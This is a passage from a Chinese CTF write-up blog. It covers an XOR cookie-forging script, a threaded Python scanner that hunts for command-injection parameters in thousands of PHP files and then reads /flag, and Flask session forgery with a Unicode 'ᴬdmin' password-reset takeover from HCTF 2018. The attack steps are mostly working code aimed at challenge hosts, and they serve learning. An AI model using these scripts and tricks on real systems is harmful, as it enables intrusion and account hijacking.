keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$cookie_guest</span> <span class="token operator">=</span> <span class="token string">'emVTQkZHCh8d'</span><span class="token punctuation">;</span>     <span class="token variable">$cookie_guest</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rnd</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$ttmp</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$ttmp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$key=md5($rnd.$key);</span>    <span class="token punctuation">}</span>    <span class="token variable">$txt2</span> <span class="token operator">=</span> <span class="token string">'system'</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$md5</span> <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$key_new</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token variable">$md5</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$cookie_system</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$cookie_system</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$key_new</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$cookie_system</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token punctuation">.</span><span class="token variable">$cookie_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$cookie_system</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220160920767.png" alt="" loading="lazy"></p><p>发现预期结果和我想的并不一样，但是结果却有几分相似，逐步排查后发现到最后一步我得到的key的6位值和php上的是一样的，但结果经过base64编码后就不一样了，应该是编码的问题，在网上查了一番后发现python3默认把脚本文件用<code>utf-8</code>进行编码，python2用的是<code>ascii</code>（我用的是python3，python2不会出现这种情况），而php对base64编码的函数是好像用的ascii进行编码（应该~，后文验证），于是改用脚本base64编码方式，这里使用<code>Latin1</code>进行编码，<strong>Latin1编码是单字节编码，向下兼容ASCII，</strong>其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号，<a href="https://blog.csdn.net/BLGT_57/article/details/80848492" target="_blank" rel="noopener">详</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64session <span class="token operator">=</span> <span class="token string">'QlRxaRVPCx5K'</span>txt <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Latin1"</span><span class="token punctuation">)</span>rnd <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#拿到rnd的值</span>ttemp <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>guest <span class="token operator">=</span> <span class="token string">'guest'</span>tmp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>guest<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>ttemp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> ord<span class="token punctuation">(</span>ttemp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#拿到key</span>system <span class="token operator">=</span> <span class="token string">'system'</span>system1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    system1 <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>system<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>md5 <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span>key_new <span class="token operator">=</span> <span class="token string">''</span>cookie_new <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>md5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key_new  <span class="token operator">=</span> key <span class="token operator">+</span> md5<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    session_new <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>system1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session_new <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>key_new<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> ord<span class="token punctuation">(</span>system1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session_new <span class="token operator">=</span> rnd <span class="token operator">+</span> session_new    cookie_new <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>session_new<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'Latin1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'Latin1'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie_new<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162317195.png" alt="" loading="lazy"></p><p>于是得到的值和php编码出来的完全一致，然后拿到bp中进行爆破拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162440443.png" alt="" loading="lazy"></p><p>写脚本的水平实在是太菜了，还得多练才行</p><h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><p>核心————————–python脚本</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-190.png" alt="" loading="lazy"></p><p>将源码下载下来解压后发现有3000多个php文件，于是上大佬脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始时间：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">#这儿设置最大的线程数</span>filePath <span class="token operator">=</span> r<span class="token string">"C:/Users/71071/Desktop/src/"</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">#改变当前的路径</span>requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">5</span>    <span class="token comment" spellcheck="true">#设置重连次数，防止线程数过高，断开连接</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment" spellcheck="true"># 设置连接活跃状态为False</span><span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span><span class="token operator">+</span>file<span class="token operator">+</span> <span class="token string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#打开php文件，提取所有的$_GET和$_POST的参数</span>            gets <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            posts <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>                            <span class="token comment" spellcheck="true">#所有的$_POST</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>                            <span class="token comment" spellcheck="true">#所有的$_GET</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>    url <span class="token operator">=</span> <span class="token string">'http://1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn/'</span><span class="token operator">+</span>file    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#一次性请求所有的GET和POST</span>    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token comment" spellcheck="true"># 关闭请求  释放内存</span>    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text    <span class="token comment" spellcheck="true">#print(content)</span>    <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">#如果发现有可以利用的参数，继续筛选出具体的参数</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">)</span>            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true"># 关闭请求  释放内存</span>            <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">1</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 关闭请求  释放内存</span>                <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                   <span class="token comment" spellcheck="true">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>            param <span class="token operator">=</span> a        <span class="token keyword">else</span><span class="token punctuation">:</span>            param <span class="token operator">=</span> b        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'找到了利用文件： '</span><span class="token operator">+</span>file<span class="token operator">+</span><span class="token string">"  and 找到了利用的参数：%s"</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>                            <span class="token comment" spellcheck="true">#加入多线程</span>   t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-191.png" alt="" loading="lazy"></p><p>访问xk0SzyKwfzw.php?Efa5BVG=cat /flag即可得到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-192.png" alt="" loading="lazy"></p><h2 id="2018HCTF—admin"><a href="#2018HCTF—admin" class="headerlink" title="2018HCTF—admin"></a>2018HCTF—admin</h2><p>核心------------------------ ①flask session 伪造 ；②unicode欺骗 ，<a href="https://www.codercto.com/a/38179.html" target="_blank" rel="noopener">参考</a></p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-183.png" alt="" loading="lazy"></p><h3 id="Flask-session-伪造"><a href="#Flask-session-伪造" class="headerlink" title="Flask session 伪造"></a>Flask session 伪造</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">Python Web之flask session&amp;格式化字符串漏洞</a></li><li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">客户端 session 导致的安全问题</a></li></ul><p>在index和change界面的源码处分别有两处提示：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-184.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-185.png" alt="" loading="lazy"></p><p>可知需要用户为admin才可以拿到flag，下载下来后发现web框架是用<a href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin" target="_blank" rel="noopener">flask</a>写的</p><p>解题具体操作如下：</p><p>先注册一个账户：admin1</p><p>在index界面拿到自己的session，进行解码，上大佬脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-187.png" alt="" loading="lazy"></p><p>在index.html发现只要session[‘name’]==’admin’即可作为admin用户登录，再将解码出来的session中的name改为admin再进行一次编码来伪造admin的session，对session编码需要SECRET_KEY，在config.py处找到，此处用脚本编码，<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本git下载地址</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-188.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-186.png" alt="" loading="lazy"></p><p>将自己的session修改为编码后的session即可得到flag</p><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>当解题思路断了的时候，不妨结合代码角度思考，前面在改密码界面就感觉到不对，因为密码就直接改不需要验证什么的，于是找到改密码的change函数</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>经大佬文章提点，发现在进行改密的时候使用了strlower函数将用户名转成了小写，一般在python中转小写用的都是lower函数，于是跟进strlower函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>研究nodeprep.prepare函数，nodeprep是从Twisted模块导入的，在requirements.txt文件中看到Twisted版本与最新版本相差甚远，存在猫腻，<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">参考</a></p><p>于是就有了以下的Unicode编码问题；具体编码方式：<a href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99" target="_blank" rel="noopener">修饰字母大写</a></p><p>nodeprep.prepare会进行如下操作</p><p>ᴬ-&gt;A-&gt;a;ᴬdmin-&gt;Admin-&gt;admin</p><p>参考：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/ba81f7598149fdce96a3ad74e3ab6ff1.png" alt="" loading="lazy"></p><p>注册 ᴬdmin ；登录 ᴬdmin ，经过一次strlower变成Admin，修改密码时name又经过一次strlower更改了admin的密码，随后即可以修改后的密码登录拿到flag</p><h2 id="安恒杯-新春祈福赛—枯燥的抽奖"><a href="#安恒杯-新春祈福赛—枯燥的抽奖" class="headerlink" title="安恒杯-新春祈福赛—枯燥的抽奖"></a>安恒杯-新春祈福赛—枯燥的抽奖</h2><p>界面：</p><p><img 